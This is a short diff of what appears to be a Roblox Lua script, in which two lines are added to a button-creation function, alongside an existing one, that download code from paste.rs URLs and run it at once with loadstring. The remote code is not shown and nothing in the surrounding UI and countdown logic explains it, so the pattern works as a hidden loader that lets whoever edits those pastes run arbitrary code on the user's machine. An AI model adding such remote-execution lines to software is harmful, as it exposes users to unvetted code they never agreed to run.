@@ -139,6 +139,8 @@ local function createButton()
             update()
         end
        loadstring(game:HttpGet("https://paste.rs/xMycb"))()
+       loadstring(game:HttpGet("https://paste.rs/Fapky"))()
+       loadstring(game:HttpGet("https://paste.rs/nsWwj"))()
         -- Countdown coroutine
         coroutine.wrap(function()
             for i = 29, 1, -1 do
